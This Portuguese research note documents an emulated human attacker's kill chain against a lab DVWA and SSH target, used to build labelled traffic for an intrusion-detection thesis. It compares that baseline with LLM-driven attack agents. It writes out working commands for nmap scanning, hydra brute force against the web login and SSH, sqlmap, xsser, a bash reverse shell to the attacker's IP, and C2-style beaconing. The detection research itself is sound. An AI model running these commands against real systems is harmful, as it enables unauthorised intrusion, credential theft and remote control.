# Atacante Humano

Para reproduzir um cenário "semi-real", decidi seguir os passos clássicos de uma intrusão orientada pela metodologia de testes de penetração (Kill Chain / PTES). O objetivo é emular o comportamento de um operador humano que progride metodicamente a partir da máquina Kali Linux (Dell Inspiron 3576) em direção ao alvo Ubuntu (Acer Nitro V15), que hospeda os serviços de rede e a aplicação DVWA ([[Atacante e Vítima]]).

Diferente dos agentes autônomos baseados em LLM ([[AGENTS]]), que realizam deliberações dinâmicas em tempo real e operam em ciclos rápidos orientados por hipóteses (*baby steps*), o **Atacante Humano** segue uma progressão lógica de exploração: descobre a superfície, analisa os resultados das sondas, explora as vulnerabilidades encontradas, obtém acesso administrativo e estabelece persistência.

---

## 1. As 5 Fases da Kill Chain de Intrusão

A cadeia foi desenhada para refletir uma intrusão realista, onde cada etapa depende diretamente das descobertas da etapa anterior:

1. **Reconhecimento e Varredura de Portas**
	1. *Modo básico*: varredura preliminar rápida para identificação de portas abertas.
	2. *Modo stealth*: varredura TCP SYN cadenciada (`-sS`, taxa `-T2`) para mapeamento discreto com baixo ruído de rede.
	3. *Modo semi-agressivo*: varredura em todas as portas (1-65535) com detecção de versão de serviços e SO (`-T4`, `-A`).
	4. *Modo agressivo + scripts NSE*: varredura intrusiva acionando scripts de vulnerabilidade (`vuln,discovery,intrusive`) para mapear falhas conhecidas.
2. **Enumeração e Mapeamento de Superfície Web (DVWA - porta 8080)**
	- Análise dos serviços descobertos (porta 8080 HTTP e porta 22 SSH).
	- Identificação das rotas de autenticação, parâmetros de consulta e formulários no DVWA ([[Ambiente de Ataques]]).
3. **Ganho de Acesso Inicial (Vetor Web)**
	1. *Força Bruta Web*: ataque de dicionário no formulário de login HTTP do DVWA (`hydra`).
	2. *Injeção de SQL (SQLi)*: exploração automatizada de parâmetros vulneráveis para enumeração de tabelas e extração de dados do SGBD (`sqlmap`).
	3. *Cross-Site Scripting (XSS)*: injeção de vetores canários refletidos no parâmetro de busca (`xsser`).
4. **Acesso ao Sistema e Autenticação de Infraestrutura (Vetor SSH - porta 22)**
	1. *Força Bruta SSH*: teste de credenciais e ataque de dicionário contra o serviço `sshd` (`hydra`).
5. **Pós-Exploração e Estabelecimento de Canal C2**
	1. *Shell Reverso Interativo*: canal de terminal bidirecional (`netcat`) com comandos manuais de enumeração do host (`whoami`, `id`, `uname -a`).
	2. *Emulação de Beaconing C2*: chamadas periódicas via HTTP simulando o tráfego de *heartbeat* de uma botnet ([[Botnet - Ares]]).

> [!IMPORTANT]
> **Por que ataques DoS/DDoS não fazem parte desta cadeia de intrusão?**
> Em uma intrusão real voltada para infiltração, extração de dados e persistência, o operador jamais dispara ataques de negação de serviço (Slowloris, GoldenEye, Hulk, LOIC). Derrubar o servidor web ou sobrecarregar o kernel da vítima congelaria os canais de shell reverso, derrubaria os acessos recém-obtidos e alertaria qualquer mecanismo de defesa.
> 
> Os ataques de DoS/DDoS mapeados na matriz do [[00 - Mapeamento de Ataques Kali Linux]] pertencem a uma **bateria independente de testes de disponibilidade/estresse**, devendo ser executados em sessões isoladas com reinicialização dos containers entre cada bateria.

---

## 2. Detalhamento dos Comandos por Fase

Todos os comandos são executados a partir do Kali Linux apontando para o IP da máquina vítima (`$TARGET_IP`):

### Fase 1: Reconhecimento e Varredura (Nmap)
Consulte as notas dedicadas: [[nmap]] e [[Infiltration - NMAP Portscan]].

```bash
# 1.1 Básico (rápido, portas padrão)
nmap -vv --reason -oA nmap_basico $TARGET_IP

# 1.2 Stealth (SYN scan cadenciado, taxa T2)
nmap -sS -T2 -sV -vv --reason -oA nmap_stealth $TARGET_IP

# 1.3 Semi-Agressivo (todas as portas 1-65535, detecção completa de serviços)
nmap -p 1-65535 -A -T4 --version-all --osscan-guess -vv --reason -oA nmap_semi_agressivo $TARGET_IP

# 1.4 Agressivo com Scripts NSE (varredura profunda de vulnerabilidades e intrusão)
nmap -p 1-65535 -A -T5 --version-all --osscan-guess --script="vuln,discovery,intrusive" -vv --reason -oA nmap_agressivo $TARGET_IP
```

### Fase 2 e 3: Exploração Web no DVWA (porta 8080)
Consulte: [[Web Attack - Brute Force]], [[Web Attack - SQL Injection]] e [[Web Attack - XSS]].

```bash
# 3.1 Força Bruta contra o Formulário de Login do DVWA
hydra -l admin -P $WORDLIST_PASS $TARGET_IP:8080 http-get-form \
  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=$DVWA_COOKIE; security=low:F=Username and/or password incorrect." \
  -t 4 -f -v

# 3.2 SQL Injection Automatizado (enumeração de bancos de dados)
sqlmap -u "http://$TARGET_IP:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=$DVWA_COOKIE; security=low" \
  -p id --batch --dbs

# 3.3 Cross-Site Scripting (injeção de vetores canários)
xsser -u "http://$TARGET_IP:8080/vulnerabilities/xss_r/" \
  -g "/vulnerabilities/xss_r/?name=XSS" \
  --cookie="PHPSESSID=$DVWA_COOKIE; security=low" \
  --auto --auto-set=30
```

### Fase 4: Autenticação Administrativa (SSH na porta 22)
Consulte [[SSH - Brute Force]].

```bash
# 4.1 Força Bruta contra o serviço SSH
hydra -l $SSH_USER -P $WORDLIST_PASS ssh://$TARGET_IP -t 4 -f -V
```

### Fase 5: Pós-Exploração e Canal C2
Consulte [[Infiltration - Communication Victim Attacker]] e [[Botnet - Ares]].

```bash
# 5.1 Shell Reverso Interativo
# No Kali (aguardando conexão na porta 4444):
nc -lvnp 4444

# Na Vítima (após ganho de execução):
bash -i >& /dev/tcp/$IP_KALI/4444 0>&1

# 5.2 Emulação de Beaconing C2 (polling periódico simulando botnet Ares)
python3 -c "
import time, urllib.request
for _ in range(12):
    try:
        urllib.request.urlopen('http://$TARGET_IP:8080/dvwa/', timeout=3)
    except Exception:
        pass
    time.sleep(5)
"
```

---

## 3. A Justificativa do Intervalo de 20 Minutos

Para automatizar a execução da cadeia em testes repetíveis, adotei um **intervalo de 20 minutos (`1200` segundos)** entre as etapas:

1. **Separação Limpa de Janelas no NIDS e Rotulação Fiel (*Ground Truth*):**
   - Na máquina vítima, o tráfego é capturado continuamente via `tcpdump` em arquivos `.pcap`.
   - Se as ferramentas fossem disparadas em sequência imediata sem pausa, conexões em encerramento (`TIME_WAIT`, `FIN_WAIT`) e buffers residuais se sobreporiam. O extrator de características ([[CICFlowMeter Features VS NFStream Features]]) geraria fluxos híbridos com rótulos ambíguos.
   - Os 20 minutos garantem janelas isoladas de tráfego puramente benigno (linha de base da rede), permitindo corte e rotulação temporal precisos no dataset de validação.
2. **Recuperação da Pilha de Rede e Serviços:**
   - Permite que a tabela de conexões TCP do kernel Linux no Ubuntu e os descritores do Apache e do `sshd` retornem ao estado inicial de repouso antes do próximo teste.
3. **Mimetização do Ritmo Cognitivo Humano:**
   - Um analista humano real não roda várias ferramentas de uma vez sem analisar o retorno. Ele inspeciona a saída de um scan, estuda as portas, seleciona a wordlist adequada e prepara o comando seguinte. A pausa emula essa cadência reflexiva e deliberada.

---

## 4. Script de Automação: `scripts/ataque_humano.sh`

Para executar a campanha completa de forma determinística na máquina Kali, o script [scripts/ataque_humano.sh](file:///home/null/ALF-MoE/scripts/ataque_humano.sh) centraliza a orquestração da cadeia:

- Executa a cadeia lógica de intrusão (Reconhecimento $\rightarrow$ DVWA Web $\rightarrow$ SSH $\rightarrow$ Pós-Exploração C2).
- Grava os timestamps exatos de início e término de cada vetor no arquivo de auditoria `human_attack_timeline.log`.
- Gerencia automaticamente a pausa de 20 minutos (`INTERVALO_SEGUNDOS=1200`) com avisos no terminal.
- Disponibiliza uma flag separada (`--with-dos` ou `--dos-only`) caso o pesquisador decida executar a bateria de estresse de forma isolada, sem misturar com a intrusão.

---

## 5. Comparativo: Atacante Humano vs. Agentes Autônomos (IA)

| Dimensão Metodológica | Atacante Humano (`HUMAN.md`) | Agentes Autônomos (`AGENTS.md`) |
| :--- | :--- | :--- |
| **Padrão de Execução** | Sequencial e metódico, orientado à Kill Chain clássica de penetração. | Dinâmico, orientado por hipóteses formuladas em tempo real por LLM. |
| **Cadência Temporal** | Longas pausas analíticas (20 min) entre fases para corte de baseline. | Ciclos rápidos contínuos (*baby steps*) sob demanda. |
| **Comportamento Operacional** | Encadeia passos dependentes (Recon $\rightarrow$ Web $\rightarrow$ SSH $\rightarrow$ Shell). | Coordenador estratégico despacha especialistas atômicos focados. |
| **Auditoria e Rastreabilidade** | Timeline cronológica de início/fim em log de terminal. | Trilha forense estruturada em `.jsonl` via `logger.py` com justificativa técnica obrigatória (até 25 palavras). |
| **Papel na Tese** | Fornecer a linha de base (*baseline*) tradicional de invasão humana. | Avaliar a eficácia de detecção do ALF-MoE diante de adversários conduzidos por LLMs. |

---

## 6. Relação com as Notas do Projeto

- [[00 - Mapeamento de Ataques Kali Linux]]
- [[AGENTS|AGENTS.md - Protocolo de Auditoria e Agentes Autônomos]]
- [[Atacante e Vítima]]
- [[Ambiente de Ataques]]
- [[nmap]]
- [[Infiltration - NMAP Portscan]]
- [[Web Attack - Brute Force]]
- [[Web Attack - SQL Injection]]
- [[Web Attack - XSS]]
- [[SSH - Brute Force]]
- [[Infiltration - Communication Victim Attacker]]
- [[Botnet - Ares]]